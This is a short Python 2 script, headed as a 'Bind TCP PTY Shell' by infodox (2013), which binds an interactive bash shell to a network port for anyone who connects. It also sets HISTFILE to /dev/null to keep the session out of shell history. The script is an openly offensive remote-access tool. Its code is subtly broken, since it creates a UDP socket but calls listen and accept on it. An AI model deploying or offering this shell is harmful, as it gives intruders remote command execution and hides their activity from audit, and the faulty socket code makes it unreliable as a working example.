#!/usr/bin/python2
"""
Python Bind TCP PTY Shell - testing version
infodox - insecurety.net (2013)

Binds a PTY to a TCP port on the host it is ran on.
"""
import os
import pty
import sys
import socket

def main():
    if len(sys.argv) < 2:
      print("Usage:\n  " + sys.argv[0] + " <port>\n")
      exit(1)

    lport = int(sys.argv[1])
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.bind(('', lport))
    s.listen(1)
    (rem, addr) = s.accept()
    os.dup2(rem.fileno(),0)
    os.dup2(rem.fileno(),1)
    os.dup2(rem.fileno(),2)
    os.putenv("HISTFILE",'/dev/null')
    pty.spawn("/bin/bash")
    s.close()
	
if __name__ == "__main__":
    main()
